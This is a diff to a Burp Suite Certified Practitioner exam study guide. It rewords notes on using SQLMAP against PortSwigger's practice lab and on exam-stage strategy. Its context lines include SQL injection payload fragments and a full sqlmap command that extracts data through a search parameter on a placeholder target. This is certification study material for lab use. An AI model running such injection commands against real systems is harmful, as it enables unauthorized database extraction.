@@ -1920,7 +1920,7 @@ TrackingId=xxx'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encod
 
 >In the [PortSwigger Practice Exam APP](https://portswigger.net/web-security/certification/takepracticeexam/index.html) we ***identify*** SQLi on the advance search function by adding a single quote and the response result in `HTTP/2 500 Internal Server Error`.  
 
->SQLMAP version `1.7.2#stable` and `1.6 both able to exploit the PortSwigger Practice exam. [bmdyy Practice Exam walkthrough of SQLMAP](https://youtu.be/yC0F05oggTE?t=563)  
+>After doing some testing with SQLMAP versions `1.7.2#stable` and `1.6`, I found that both are able to exploit the PortSwigger Practice exam. Walkthrough from [bmdyy doing the Practice Exam using SQLMAP](https://youtu.be/yC0F05oggTE?t=563) for reference of the parameters used.  
 
 [PortSwigger Forum thread - SQLMAP](https://forum.portswigger.net/thread/stage-2-of-practice-exam-with-sqlmap-1-7-2-2078f927)  
 
@@ -1947,7 +1947,7 @@ sqlmap -u 'https://TARGET.net/filtered_search?SearchTerm=x&sort-by=DATE&writer='
 
 ![SQLMAP used to dump data from tables](images/sqlmap-dump-table-data.png)  
 
->This is also a good start with SQLMAP to identify and extract data from a sensitive error based time delay SQL injection in advance search filters.  
+>This is also a good start with SQLMAP to ***identify*** and extract data from a sensitive error based time delay SQL injection in advance search filters on the exam.  
 
 ```
 sqlmap -v -u 'https://TARGET.NET/search?term=x&organizeby=DATE&journalist=&cachebust=1656138093.57' -p "term" --batch --cookie="_lab=YESYESYESYES; session=YESYESYESYES" --random-agent --level=2 --risk=2
@@ -3368,7 +3368,7 @@ CHAR(83)+CHAR(69)+CHAR(76)+CHAR(69)+CHAR(67)+CHAR(84)
   
 ## Approach  
 
->Tips from [Daniel Redfern](https://youtu.be/Lbn8zQJByGY?t=551) is best I have come access about BSCP exam, especially Tip 7, only one active user and may be on stage 2 if you did not use interactive exploit on stage 1.  
+>Tips from [Daniel Redfern](https://youtu.be/Lbn8zQJByGY?t=551) is best I have come access explaining fundamental mechanics in BSCP exam, especially Tip 7, only one active user per application and if you reach stage 2 and you did not use interactive exploit in stage 1 that required the **Deliver to Victim** function of the exploit server, then use an interactive exploit on stage 2 to reach admin user role.  
   
 >When stuck in BSCP exam, reference the below [Micah van Deusen blog tip 5 table of category to stages](https://micahvandeusen.com/burp-suite-certified-practitioner-exam-review/) for ways to progress through the stages.  
 
